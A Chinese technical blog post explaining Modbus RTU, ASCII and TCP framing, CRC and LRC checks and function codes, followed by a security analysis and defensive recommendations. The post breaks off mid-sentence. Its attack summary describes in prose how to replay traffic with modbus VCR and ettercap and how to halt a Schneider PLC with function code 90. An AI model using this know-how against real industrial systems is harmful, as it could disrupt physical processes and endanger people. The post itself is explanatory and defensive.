<strong>a. 波特率</strong>：这是一个衡量通信速度的参数。它表示每秒钟传送的bit的个数。例如300波特表示每秒钟发送300个bit。当我们提到时钟周期时，我们就是指波特率。例如如果协议需要4800波特率，那么时钟是4800Hz。这意味着串口通信在数据线上的采样率为4800Hz。通常电话线的波特率为14400，28800和36600。波特率可以远远大于这些值，但是波特率和距离成反比。高波特率常常用于放置的很近的仪器间的通信，典型的例子就是GPIB设备的通信。<br>  <strong>b. 数据位</strong>：这是衡量通信中实际数据位的参数。当计算机发送一个信息包，实际的数据不会是8位的，标准的值是5、7和8位。如何设置取决于你想传送的信息。比如，标准的ASCII码是0～127（7位）。扩展的ASCII码是0～255（8位）。如果数据使用简单的文本（标准 ASCII码），那么每个数据包使用7位数据。每个包是指一个字节，包括开始/停止位，数据位和奇偶校验位。由于实际数据位取决于通信协议的选取，术语“包”指任何通信的情况。<br>  <strong>c. 停止位</strong>：用于表示单个包的最后一位。典型的值为1，1.5和2位。由于数据是在传输线上定时的，并且每一个设备有其自己的时钟，很可能在通信中两台设备间出现了小小的不同步。因此停止位不仅仅是表示传输的结束，并且提供计算机校正时钟同步的机会。适用于停止位的位数越多，不同时钟同步的容忍程度越大，但是数据传输率同时也越慢。<br>  <strong>d. 奇偶校验位</strong>：在串口通信中一种简单的检错方式。有四种检错方式：偶、奇、高和低。当然没有校验位也是可以的。对于偶和奇校验的情况，串口会设置校验位（数据位后面的一位），用一个值确保传输的数据有偶个或者奇个逻辑高位。例如，如果数据是011，那么对于偶校验，校验位为0，保证逻辑高的位数是偶数个。如果是奇校验，校验位位1，这样就有3个逻辑高位。高位和低位不真正的检查数据，简单置位逻辑高或者逻辑低校验。这样使得接收设备能够知道一个位的状态，有机会判断是否有噪声干扰了通信或者是否传输和接收数据是否不同步。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89l02e0rnj30n90e2jvs.jpg" alt="image-20191024205159337"></p></blockquote><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>早在1971年，Modicon公司首次推出了Modbus协议，ModbusRTU和Modbus ASCII诞生于此。后来施耐德电气（SchneiderElectric）收购了Modicon公司，并在1997年推出了ModbusTCP协议。2004年，中国国家标准委员会正式把Modbus作为了国家标准，开启了Modbus为中国工业通信做贡献的时代。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89leq1mqdj30o00fjq4x.jpg" alt="image-20191024205739456"></p><p>通过此协议，控制器相互之间、控制器经由网络和其它设备之间可以通信。Modbus协议具有标准、开放，可以支持多种电气接口，数据帧格式简单紧凑，数据传输量大、实时性好等特点，在工业控制系统中得到了广泛的应用，已经成为通用工业标准。深入分析Modbus协议实现原理和其安全性对提高工控系统安全性有着重要的现实意义。ModbusRTU和ModbusASCII主要用于串行通信领域，而ModbusTCP则常用于以太网通信。现在，Modbus已经成为工业领域通信协议标准，并且现在是工业电子设备之间相当常用的连接方式。</p><p><a href="https://image.3001.net/images/20170921/15060057119653.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89irrxfujj30j604n75s.jpg" alt="israbye FreeBuf.COM"></a></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89kuqvhv0j30nb0a7gnm.jpg" alt="image-20191024204652957"></p><h2 id="协议原理"><a href="#协议原理" class="headerlink" title="协议原理"></a>协议原理</h2><p>Modbus使用一种简单的MasterandSlave主从协议（客户机/服务器协议）进行通信。客户机作为主站，向服务器发送请求；服务器（从站）接到请求后，对请求进行分析并作出应答。其中使用的通信帧被称为应用数据单元（Application Data Unit，ADU），它包括通信地址段、功能代码段、数据段和校验段，如下图： </p><p><a href="https://image.3001.net/images/20170921/1506005632357.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89irsxzo4j30j604u0t8.jpg" alt="israbye FreeBuf.COM"></a></p><p>一般使用上，监控系统(HMI)都为Master，PLC、电表、仪表等都为Slave，HMI系统一直PollingSlave的各种relayandregister最新数值，然后做显示及各种逻辑计算及控制调整等处理。</p><p>其中，功能代码段和数据段组合称为协议数据单元（Protocol Data Unit or Protocol Description Unit)，PDU）。功能代码段占用一个字节，取值范围为1-255，其中128-255为保留值，用于异常消息应答报文。1-127为功能代码编号，其中65-72和100-110为用户自定义编码。</p><p>Modbus协议建立了主设备查询的格式：设备（或广播）地址、功能代码、所有要发送的数据、错误检测域。</p><p>从设备回应消息也由Modbus协议构成，包括：确认要行动的域、任何要返回的数据、和错误检测域。</p><p><strong><em>查询</em></strong></p><p>数据段包含了从设备要执行功能的任何附加信息：从何寄存器开始读、要读的寄存器数量，错误检测域为从设备提供了一种验证消息内容是否正确的方法。</p><p><strong><em>回应</em></strong></p><p>查询消息中的功能代码的回应。数据段包括了从设备收集的数据：像寄存器值或状态。如果有错误发生，功能代码将被修改以用于指出回应消息是错误的，同时数据段包含了描述此错误信息的代码。错误检测域允许主设备确认消息内容是否可用。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89lfkj27yj310l09r79j.jpg" alt="image-20191024210653222"></p><h2 id="传输方式"><a href="#传输方式" class="headerlink" title="传输方式"></a>传输方式</h2><p>Modbus 协议是一种应用层报文传输协议，包括ASCII、RTU、TCP三种报文类型，协议本身并没有定义物理层，只是定义了控制器能够认识和使用的消息结构，而不管它们是经过何种网络进行通信的。</p><p>Modbus 协议使用串口传输时可以选择RTU或ASCII模式，并规定了消息、数据结构、命令和应答方式并需要对数据进行校验。ASCII 模式采用LRC校验，RTU模式采用16 位CRC校验。RTU与ASCII不能混用，ASCII可打印字符便于故障检测，而且对用高级语言（如Fortran）编程的主计算机及主PC很适宜。RTU则适用于机器语言编程的计算机和PC主机。 通过以太网传输时使用TCP，这种模式不使用校验，因为TCP协议是一个面向连接的可靠协议。</p><p>​    <strong><em>ASCII与RTU相互转换</em></strong></p><p>​    RTU模式传输的数据:是8位二进制字符，分高位和低位，每部分各含4位。</p><p>​    ASCII模式传输的数据:是16位十六进制字符。</p><p>区别：</p><ul><li>​    ASCII模式使用的字符虽是RTU模式的两倍，但ASCII数据的译码和处理更为容易一些</li><li>​    用RTU模式时报文字符必须以连续数据流的形式传送，用ASCII模式，字符之间可产生长达1s的间隔，以适应速度较慢的机器。</li></ul><p>​    <strong><em>ASCII</em></strong></p><p>​    一个信息中的每4位字节作为1个ASCII字符传输，如数值63H用ASCII方式时，需发送两个字节，即ASCII“6”（0110110）和ASCII”3“（0110011），1个ASCII字符占用的位数有7位和8位，国际通用7位为多。这种方式的主要优点是字符发送的时间间隔可达到1秒而不产生错误。</p><p>代码系统：</p><ul><li><p>十六进制，ASCII字符0…9,A…F</p></li><li><p>消息中的每个ASCII字符都是一个十六进制字符组成</p><p>每个字节的位：</p></li><li><p>1个起始位</p></li><li><p>7个数据位，最小的有效位先发送</p></li><li><p>1个奇偶校验位，无校验则无</p></li><li><p>1个停止位（有校验时），2个Bit（无校验时）</p></li><li><p>错误检测域</p></li><li><p>LRC(纵向冗长检测)</p></li></ul><p>​    <strong><em>RTU</em></strong></p><p>​    当控制器设为在Modbus网络上以RTU模式通信，在消息中的每个8Bit字节按照原值传送，不做处理，如63H，RTU将直接发送01100011。这种方式的主要优点是：数据帧传送之间没有间隔，相同波特率下传输数据的密度要比ASCII高，传输速度更快。</p><p>代码系统：</p><ul><li>​    8位二进制，十六进制数0…9，A…F</li><li>​    消息中的每个8位域都是一或两个十六进制字符组成</li></ul><p>每个字节的位：</p><ul><li><p>​    1个起始位</p></li><li><p>​    8个数据位，最小的有效位先发送</p></li><li><p>​    1个奇偶校验位，无校验则无</p></li><li><p>​    1个停止位（有校验时），2个Bit（无校验时）</p></li></ul><h2 id="Modbus数据模型"><a href="#Modbus数据模型" class="headerlink" title="Modbus数据模型"></a>Modbus数据模型</h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89lw1t6d9j30yb0bsgr2.jpg" alt="image-20191024212243618"></p><h2 id="Modbus-RTU和Modbus-ASCII有什么区别？"><a href="#Modbus-RTU和Modbus-ASCII有什么区别？" class="headerlink" title="Modbus RTU和Modbus ASCII有什么区别？"></a>Modbus RTU<strong>和</strong>Modbus ASCII有什么区别？</h2><p>Modbus是一种应用层协议，它定义了与基础网络无关的数据单元（ADU），可以在以太网（TCP/IP）或串行链路上（RS232、RS485等）进行通信（以太网ADU和串行ADU略有不同）。在串行链路上，Modbus协议有两种传输模式——ASCII模式和RTU模式。其中，ASCII是英文“American Standard Code for Information Interchange”的缩写，中文翻译为“美国国家信息交换标准编码”；RTU是英文“ Remote Terminal Unit”的缩写，中文翻译为“远程终端设备”。</p><p>首先，让我们来看看Modbus的工作原理。</p><p>Modbus采用主从（Master-Salve）通信模式，仅有主设备（Master）能对传输进行初始化，从设备（Slave）根据主设备的请求进行应答。典型的主设备包括现场仪表和显示面板，典型的从设备为可编程逻辑控制器（PLC）。</p><p>在串行链路的主从通信中，Modbus主设备可以连接一个或N（最大为247）个从设备，主从设备之间的通信包括单播模式和广播模式。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89m3i1roxj30yp04ymy1.jpg" alt="image-20191024212953487"></p><p>在广播模式中，Modbus主设备可同时向多个从设备发送请求（设备地址0用于广播模式），从设备对广播请求不进行响应。</p><p>在单播模式中，主设备发送请求至某个特定的从设备（每个Modbus从设备具有唯一地址），请求的消息帧中会包含功能代码和数据，比如功能代码“01”用来读取离散量线圈的状态。从设备接到请求后，进行应答并把消息反馈主设备。</p><p><a href="https://image.3001.net/images/20170921/1506006245516.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89irrip7gj30av092myt.jpg" alt="israbye FreeBuf.COM"></a></p><p>在主从设备的通信中，可以使用ASCII模式或者RTU模式。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89m4b3ybrj30yp0evwkj.jpg" alt="image-20191024213040383"></p><p>在ASCII（AmericanStandard Code for Information Interchange）传输模式下，消息帧以英文冒号（“：”，ASCII3A Hex）开始，以回车 和换号（CRLF，ASCII 0D and 0A Hex）符号结束，允许的传输的字符集为十六进制的0-9和A-F；网络中的从设备监视传输通路上是否有英文冒号（“：”），如果有的话，就对消息帧进行解码，查看消息中的地址是否与自己的地址相同，如果相同的话，就接收其中的数据；如果不同的话，则不予理会。</p><p><a href="https://image.3001.net/images/20170921/15060064703424.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89iru5pozj30j603nmxw.jpg" alt="israbye FreeBuf.COM"></a></p><p>在ASCII模式下，每个8位的字节被拆分成两个ASCII字符进行发送，比如十六进制数0xAF ,会被分解成ASCII字符“A”和“F”进行发送，发送的字符量比RTU增加一倍。ASCII模式的好处是允许两个字符之间间隔的时间长达1s而不引发通信故障，该模式采用纵向冗余校验（Longitudinal Redundancy Check ，LRC)） 的方法来检验错误，</p><p>当控制器设为在Modbus 网络上以ＲTU 模式通信，消息中的每个8Bit 字节都包含两个4 Bit 的十六进制字符，这种模式没有开始和结束标记。其优点是: 在同样的波特率下，可比传送更多的数据。</p><p>在RTU（RemoteTerminal Unit）模式下，每个字节可以传输两个十六进制字符，比如十六进制数0xAF，直接以十六进制0xAF（二进制：10101111）进行发送，因此它的发送密度比ASCII模式高一倍；RTU模式采用循环冗余校验（CRC），下面是对RTU模式的总结：</p><p>具体格式如图 所示。</p><p><a href="https://image.3001.net/images/20170921/15060064268162.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89irtpjphj30j603fq3f.jpg" alt="israbye FreeBuf.COM"></a></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89m9s89wmj30mk037t9w.jpg" alt="image-20191024213555654"></p><h2 id="CRC与LRC"><a href="#CRC与LRC" class="headerlink" title="CRC与LRC"></a>CRC与LRC</h2><p><strong><em>CRC</em></strong></p><p>CRC域是两个字节，包含一16位的二进制值。它由传输设备计算后加入到消息中。接收设备重新计算收到消息的CRC，并与接收到的CRC域中的值比较，如果两个值不同，则有误。</p><p>CRC是先调入值是全“1”的16位寄存器，然后调用过程将消息中连续的8位字节和当前寄存器中的值进行处理。仅每个字符中的8Bit数据对CRC有效，起始位和停止位以及奇偶校验位均无效。</p><p>CRC产生过程中，每个8位字符都单独和寄存器内容相异或（XOR），结果向最低有效位方向移动，最高有效位以0填充。LSB被提取出来检测，如果LSB为1，寄存器单独和预置的值或一下，如果LSB为0，则不进行。整个过程要重复8次。在最后一位（第8位）完成后，下一个8位字节又单独和寄存器的当前值相异或（XOR）。最终寄存器中的值，是消息中所有的字节都执行之后的CRC值。</p><p>CRC添加到消息中时，低字节先加入，然后高字节。</p><p>CRC-16错误校验程序如下：报文（此处只涉及数据位，不指起始位、停止位和任选的奇偶校验位）被看作是一个连续的二进制，其最高有效位（MSB）首选发送。报文会先与X↑16相乘（左移16位），然后看X↑16+X↑15+X↑2+1除，X↑16+X↑15+X↑2+1可以表示为二进制数11000，0000，0000，0101。整数商位忽略不记，16位余数加入该报文（MSB先发送），成为2个CRC校验字节。余数中的1全部初始化，以免所有的零成为一条报文被接收。经上述处理而含有CRC字节的报文，若无错误，到接收设备后再被同一多项式（X↑16+X↑15+X↑2+1）除，会得到一个零余数（接收设备核验这个CRC字节，并将其与被传送的CRC比较）。全部运算以2为模（无进位）。</p><p>习惯于成串发送数据的设备会首选送出字符的最右位（LSB-最低有效位）。而在生成CRC情况下，发送首位应是被除数的最高有效位MSB。由于在运算中不用进位，为便于操作起见，计算CRC时设MSB在最右位。生成多项式的位序也必须反过来，以保持一致。多项式的MSB略去不记，因其只对商有影响而不影响余数。</p><p>生成CRC-16校验字节的步骤如下：</p><ol><li><p>装如一个16位寄存器，所有数位均为1。</p></li><li><p>该16位寄存器的高位字节与开始8位字节进行“异或”运算。运算结果放入这个16位寄存器。</p></li><li><p>把这个16寄存器向右移一位。</p></li><li><p>若向右（标记位）移出的数位是1，则生成多项式10，1000，000，0000，001和这个寄存器进行“异或”运算；若向右移出的数位是0，则返回3。</p></li><li><p>重复3和4，直至移出8位。</p></li><li><p>另外8位与该十六位寄存器进行“异或”运算。</p></li><li><p>重复3-6，直至该报文所有字节均与16位寄存器进行“异或”运算，并移位8次。</p></li><li><p>这个16位寄存器的内容即2字节CRC错误校验，被加到报文的最高有效位。</p></li></ol><p>另外，在某些非Modbus通信协议中也经常使用CRC16作为校验手段，而且产生了一些CRC16的变种，他们是使用CRC16多项式X↑16+X↑15+X↑2+1，单首次装入的16位寄存器为0000；使用CRC16的反序X↑16+X↑14+X↑1+1，首次装入寄存器值为0000或FFFFH。</p><p><strong><em>LRC</em></strong></p><p>LRC错误校验用于ASCII模式。这个错误校验是一个8位二进制数，可作为2个ASCII十六进制字节传送。把十六进制字符转换成二进制，加上无循环进位的二进制字符和二进制补码结果生成LRC错误校验（参见图）。这个LRC在接收设备进行核验，并与被传送的LRC进行比较，冒号（：）、回车符号（CR）、换行字符（LF）和置入的其他任何非ASCII十六进制字符在运算时忽略不计。</p><h2 id="帧的标示与识别"><a href="#帧的标示与识别" class="headerlink" title="帧的标示与识别"></a>帧的标示与识别</h2><p>报文帧的识别</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89mbjn0tsj30vd06pdie.jpg" alt="image-20191024213737329"></p><p>字符之间的要求</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89mc2br71j30vd06pdhy.jpg" alt="image-20191024213807380"></p><h2 id="MODBUS-TCP注意点"><a href="#MODBUS-TCP注意点" class="headerlink" title="MODBUS TCP注意点"></a>MODBUS TCP注意点</h2><h3 id="主机和从机、服务端和客户端"><a href="#主机和从机、服务端和客户端" class="headerlink" title="主机和从机、服务端和客户端"></a>主机和从机、服务端和客户端</h3><p>【在modbus协议中】</p><p>主机发送modbus请求，从机根据请求内容向主机返回响应。在modbus协议中，主机总是主动方，从机总是被动方。</p><p>【在网络应用中】</p><p>在网络应用中存在客户端和服务器端，客户端（例如浏览器）发送请求到服务器，服务器向客户端返回内容（例如HTML文本）。</p><p>【在modbus tcp中】</p><p>主机是客户端，而从机是服务器端。千万不要以为服务器端重要，主机也重要，所以主机就是服务器端。</p><h3 id="是否可以多主机"><a href="#是否可以多主机" class="headerlink" title="是否可以多主机"></a>是否可以多主机</h3><p>  通过前面的分析，主机为客户端那么modbustcp支持多个主机，在一个局域网中可存在多个主机和多个从机。从机的连接能力（连接主机的数量）由uIP的最大TCP连接个数决定。</p><h3 id="modbus-TCP协议简述"><a href="#modbus-TCP协议简述" class="headerlink" title="modbus TCP协议简述"></a>modbus TCP协议简述</h3><p>modbus TCP和modbus RTU基本相同，但是也存在一些区别</p><p>a.从机地址变得不再重要，多数情况下忽略。从某种意义上说从机地址被IP地址取代</p><p>b.CRC校验变得不再重要，甚至可以忽略。由于TCP数据包中已经存在校验，为了不重复造轮子，modbus TCP干脆取消了CRC校验。</p><p>TCP 模式是为了让Modbus 数据顺利在以太网上传输产生的，使用TCP502 端口。该协议物理层，数据链路层，网络层，传输层都是基于TCP 协议，只在应用层，将Modbus 协议修改后封装进去; 接收端将该TCP 数据包拆封后，重新获得原始Modbus 帧，然后按照Modbus 协议规范进行解析，并将返回的数据包重新封装进TCP 协议中，返回到发送端。与串行链路传输的数据格式不同，TCP 模式去除了附加地址和校验，增加了报文头，其具体格式如图4所示。</p><p> <a href="https://image.3001.net/images/20170921/1506006521490.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89irt8wamj30j60avdif.jpg" alt="israbye FreeBuf.COM"></a></p><p>在modbus TCP中包含一个MBAP头，该头包含以下几个部分</p><table><thead><tr><th align="left">区域</th><th align="left">长度</th><th align="left">描述</th><th align="left">客户端</th><th align="left">服务器</th></tr></thead><tbody><tr><td align="left">传输标志</td><td align="left">2字节</td><td align="left">MODBUS 请求和响应传输过程中序列号</td><td align="left">客户端生成</td><td align="left">应答时复制该值</td></tr><tr><td align="left">协议标志</td><td align="left">2字节</td><td align="left">Modbus协议默认为0</td><td align="left">客户端生成</td><td align="left">应答时复制该值</td></tr><tr><td align="left">长度</td><td align="left">2字节</td><td align="left">剩余部分的长度</td><td align="left">客户端生成</td><td align="left">应答时由服务器端生成</td></tr><tr><td align="left">单元标志</td><td align="left">1字节</td><td align="left">从机标志（从机地址）</td><td align="left">客户端生成</td><td align="left">应答时复制该值</td></tr></tbody></table><p>【注意】</p><blockquote><p>【1】传输标志可理解为序列号，防止 MODBUS TCP通信错位，例如后发生的响应先到了主机，而早发生的响应后到主机</p><p>【2】单元标志可理解为从机地址，此时已经不再重要</p></blockquote><h3 id="modbus-tcp-和-TCP-IP的关系"><a href="#modbus-tcp-和-TCP-IP的关系" class="headerlink" title="modbus tcp 和 TCP IP的关系"></a>modbus tcp 和 TCP IP的关系</h3><p>modbus TCP可以理解为发生在TCP上的应用层协议，既然是TCP协议那么一个完整的MODBUSTCP报文必然包括TCP首部，IP首部和Ethernet首部。</p><h2 id="功能码作用"><a href="#功能码作用" class="headerlink" title="功能码作用"></a>功能码作用</h2><p>启动Modbus事务处理的客户机创建Modbus应用数据单元。功能码（PDU中的）向服务器指示将执行哪种操作。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89mfzk77yj30am0lljtr.jpg" alt="image-20191024214153200"></p><p>用一个字节编码Modbus数据单元的功能码域。有效范围是十制制1-255（128-255为异常响应保留）。当从客户机向服务器发送报文时，功能码域通过服务器执行哪种操作。</p><p>从客户机向服务器发送的报文数据域包括附加信息，服务器使用这个信息执行功能码定义的操作。这个域还包括离散项目和寄存器地址、处理项目的数量以及域中的实际数据字节数。</p><p>在某种请求中，数据域可以是不存在的，在此情况下服务器不需要任何附加信息。功能码仅说明操作。</p><p><strong>功能码的类型</strong></p><p>功能码主要分为有效功能码、异常功能码和错误功能码。</p><p>如果在一个正确接收Modbus ADU中，不出现与请求Modbus功能有关的差错，那么服务器至客户机的响应数据会包含请求中的正常功能码。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89lm0csp6j30un0f7n1r.jpg" alt="image-20191024211304406"></p><p>如果出现与请求Modbus功能有关的差错，那么响应数据会包含一个异常码和错误码。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89lo01xnvj30kl0a5gnk.jpg" alt="image-20191024211459248"></p><p>例如，客户机能够读一组离散量输出或输入的开/关状态，或者用户能够读/写一组寄存器数据内容。当服务器对客户机响应时，它使用功能码域来指示正常（无差错）响应或出现某种差错（称为异常响应）。对于一个正常响应来说，服务器仅对原始功能码响应，如下图：</p><p>对于异常响应，服务器返回一个与客户机等同的码，设置该原始功能码的最高有效位为逻辑1，并加该异常码后增加错误码，以通知客户机异常原因。如下图：</p><p><strong>有效功能码</strong></p><p>有效功能码有二十几种，但是一般使用上都以1、2、3、4、5、6、15、16等八种最为常用，以及另外特殊使用的20、21两种，此为General Reference Register，绝大部份的Modbus设备并不会提供此Register。于PLC上主要的控制数据有下列四种型式。此八种功能码就是处理这些控制资料，详细说明如下各点：</p><p><strong>控制数据四种型式：</strong></p><p>DI：DigitalInput（数字输入，离散输入），一个地址一个数据位，用户只能读取它的状态，不能修改。以一个 bit表示 On/Off，用来记录控制信号的状态输入，例如：开关，接触点，马达运转，超限switch…等等。于PLC上被称为Input relay、input coil等。</p><p>DO：DigitalOutput（数字输出，线圈输出），一个地址一个数据位，用户可以置位、复位，可以回读状态。以一个 bit表示 On/Off，用来输出控制信号，以激活或停止马达，警铃，灯光…等等。于PLC上被称为Output relay、Output coil等。</p><p>AI：Analog Input（模拟输入，输入寄存器），一个地址16位数据，用户只能读，不能修改，，以16 bits integer表示一个数值，用来记录控制信号的数值输入，例如：温度、流量、料量、速度、转速、文件板开度、液位、重量…等等。于PLC上被称为Input register。</p><p>AO：AnalogOutput（模拟输出，保持寄存器），一个地址16位数据，用户可以写，也可以回读，以16 bits integer表示一个数值，用来输出控制信号的数值，例如：温度、流量、速度、转速、文件板开度、饲料量…等等设定值。于PLC上被称为Output register、Holding register。</p><p><a href="https://image.3001.net/images/20170921/15060065568486.png"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89irsc3sqj30j60gsagn.jpg" alt="israbye FreeBuf.COM"></a></p><p><strong>Modbus功能码与数据类型的对应</strong></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89mhyofizj30xv0evq7s.jpg" alt="image-20191024214346782"></p><h2 id="Modebus异常码"><a href="#Modebus异常码" class="headerlink" title="Modebus异常码"></a>Modebus异常码</h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g89mjuatjbj30xv0k8drp.jpg" alt="image-20191024214535974"></p><h2 id="Modbus-协议安全性分析"><a href="#Modbus-协议安全性分析" class="headerlink" title="Modbus 协议安全性分析"></a>Modbus <strong>协议安全性分析</strong></h2><p>Modbus 协议是典型的工控网协议，研究其安全性对于加强工业控制网络的安全性有重要意义。一般来说，协议安全性问题可以分为两种，一种是协议自身的设计和描述引起的安全问题; 另一种是协议的不正确实现引起的安全问题。Modbus 协议也存在着这两方面的问题。</p><h3 id="Modbus-协议的固有问题"><a href="#Modbus-协议的固有问题" class="headerlink" title="Modbus 协议的固有问题"></a>Modbus 协议的固有问题</h3><p>绝大多数工控协议在设计之初，仅仅考虑了功能实现、提高效率、提高可靠性等方面，而没考虑过安全性问题。Modbus 协议也不例外，尽管其已经成为事实上的工业标准。从前面原理分析可以看出其本身的安全性问题是: 缺乏认证、授权、加密等安全防护机制和功能码滥用问题。</p><p><strong>( 1) 缺乏认证</strong></p><p>认证的目的是保证收到的信息来自合法的用户，未认证用户向设备发送控制命令不会被执行。在Modbus 协议通信过程中，没有任何认证方面的相关定义，攻击者只需要找到一个合法的地址就可以使用功能码就能建立一个Modbus 通信会话，从而扰乱整个或者部分控制过程。</p><p><strong>( 2) 缺乏授权</strong></p><p>授权是保证不同的特权操作需要由拥有不同权限的认证用户来完成，这样可大大降低误操作与内部攻击的概率。目前，Modbus 协议没有基于角色的访问控制机制，也没有对用户分类，没有对用户的权限进行划分，这会导致任意用户可以执行任意功能。</p><p><strong>( 3) 缺乏加密</strong></p><p>加密可以保证通信过程中双方的信息不被第三方非法获取。Modbus 协议通信过程中，地址和命令全部采用明文传输，因此数据可以很容易的被攻击者捕获和解析，为攻击者提供便利。</p><p><strong>( 4) 功能码滥用</strong></p><p>功能码是Modbus 协议中的一项重要内容，几乎所有的通信都包含功能码。目前，功能码滥用是导致Modbus 网络异常的一个主要因素。例如不合法报文长度，短周期的无用命令，不正确的报文长度，确认异常代码延迟等都有可能导致拒绝服务攻击。</p><h3 id="协议实现产生的问题"><a href="#协议实现产生的问题" class="headerlink" title="协议实现产生的问题"></a>协议实现产生的问题</h3><p>虽然Modbus 协议获得了广泛的应用，但是在实现具体的工业控制系统时，开发者并不具备安全知识或者没有意识到安全问题。这样就导致了使用Modbus 协议的系统中可能存在各种各样的安全漏洞。</p><p><strong>( 1) 设计安全问题</strong></p><p>Modbus 系统开发者重点关注的是其功能实现问题，安全问题在设计时很少被注意到。设计安全是指设计时充分考虑安全性，解决Modbus 系统可能出现的各种异常和非法操作等问题。比如在通信过程中，某个节点被恶意控制后发出非法数据，就需要考虑这些数据的判别和处理问题。</p><p><strong>( 2) 缓冲区溢出漏洞</strong></p><p>缓冲区溢出是指在向缓冲区内填充数据时超过了缓冲区本身的容量导致溢出的数据覆盖在合法数据上，这是在软件开发中最常见也是非常危险的漏洞，可以导致系统崩溃，或者被攻击者利用来控制系统。Modbus 系统开发者大多不具备安全开发知识，这样就会产生很多的缓冲区溢出漏洞，一旦被恶意者利用会导致严重的后果。</p><p><strong>( 3) Modbus TCP 安全问题</strong></p><p>目前，Modbus 协议已经可以在通用计算机和通用操作系统上实现，运行于TCP /IP 之上以满足发展需要。这样，TCP /IP 协议自身存在的安全问题不可避免地会影响到工控网络安全。非法网络数据获取，中间人，拒绝服务， IP 欺骗，病毒木马等在IP 互联网中的常用攻击手段都会影响Modbus 系统安全。</p><h3 id="Modbus协议常见攻击总结"><a href="#Modbus协议常见攻击总结" class="headerlink" title="Modbus协议常见攻击总结"></a>Modbus协议常见攻击总结</h3><h4 id="Modbus协议中间人攻击"><a href="#Modbus协议中间人攻击" class="headerlink" title="Modbus协议中间人攻击"></a>Modbus协议中间人攻击</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8amra4y0ej30a204kgmc.jpg" alt="image-20191025183816402"></p><p>modbus协议易于遭受中间人攻击（MiTM），攻击类型主要包括记录和重放攻击。有许多工具可以对modbus发起中间人攻击，开源工具modbus VCR就是其一，modbus vcr与ettercap工具配合使用可以记录modbus协议的流量并进行重放，从而使系统在某段记录下的时间区间内仍表现为正常。</p><h4 id="Schneider终止cpu运行攻击"><a href="#Schneider终止cpu运行攻击" class="headerlink" title="Schneider终止cpu运行攻击"></a>Schneider终止cpu运行攻击</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8an2cnpdqj30a204kgmh.jpg" alt="image-20191025184856902"></p><p>modbus中包括了一些未公开的功能码，这些功能码是厂商所使用的专用功能码。其中有一个特别好用的功能码：90（0*5a），对于大多数专有协议而言，必须使用工程软件才能够了解这些协议的工作方式。</p><p>使用Unity Pro可以使用功能码90终止CPU的运转，导致逻辑暂停执行，PLC也将停止所有执行功能。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8aoa168fbj30gq0et0zm.jpg" alt="image-20191025193055598"></p><h4 id="Schneider功能码90鉴别攻击"><a href="#Schneider功能码90鉴别攻击" class="headerlink" title="Schneider功能码90鉴别攻击"></a>Schneider功能码90鉴别攻击</h4><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8aobgl4qyj30a5040dgm.jpg" alt="image-20191025193218601"></p><p>modbus nmap脚本通过modbus协议的功能码43和功能码90与设备通信，收集信息帮助建立设备简况（profile），使用设备自带的本地命令可以安全的从设备中提取信息，且不会对设备造成影响。</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8aofzmw1dj30f9074jto.jpg" alt="image-20191025193638980"></p><h3 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h3><p>目前，Modbus 系统采取的安全防护措施普遍不足，这里参考信息安全业内研究并结合工控系统自身的安全问题，提出了一些安全建议，能够有效地降低工业控制系统面临的威胁。</p><p><strong>( 1) 从源头开始</strong></p><p>工控网络漏洞，很大一部分是其实现过程出现的漏洞。如果从源头开始控制，从Modbus 系统的需求设计、开发实现、内部测试和部署等阶段，全生命周期的介入安全手段，融入安全设计、安全编码以及安全测试等技术，可以极大地消除安全漏洞，降低整个Modbus 系统的安全风险。</p><p><strong>( 2) 异常行为检测</strong></p><p>异常行为代表着可能发生威胁，不管是有没有攻击者，因此开发针对Modbus 系统的专用异常行为检测设备可以极大提高工控网络的安全性。针对Modbus 系统，首先要分析其存在的各种操作行为，依据“主体，地点，时间，访问方式，操作，客体”等行为描述成一个六元组模型; 进而分析其行为是否属于异常; 最终决定采取记录或者报警等措施。</p><p><strong>( 3) 安全审计</strong></p><p>Modbus 的安全审计就是对协议数据进行深度解码分析，记录操作的时间、地点、操作者和操作行为等关键信息，实现对Modbus 系统的安全审计日志记录和审计功能，从而提供安全事件爆发后的时候追查能力。</p><p><strong>( 4) 使用网络安全设备</strong></p><p>使用入侵防御和防火墙等网络安全设备。防火墙是一个串行设备，通过设置，只允许特定的地址访问服务端，禁止外部地址访问Modbus 服务器，可以有效的防止外部入侵; 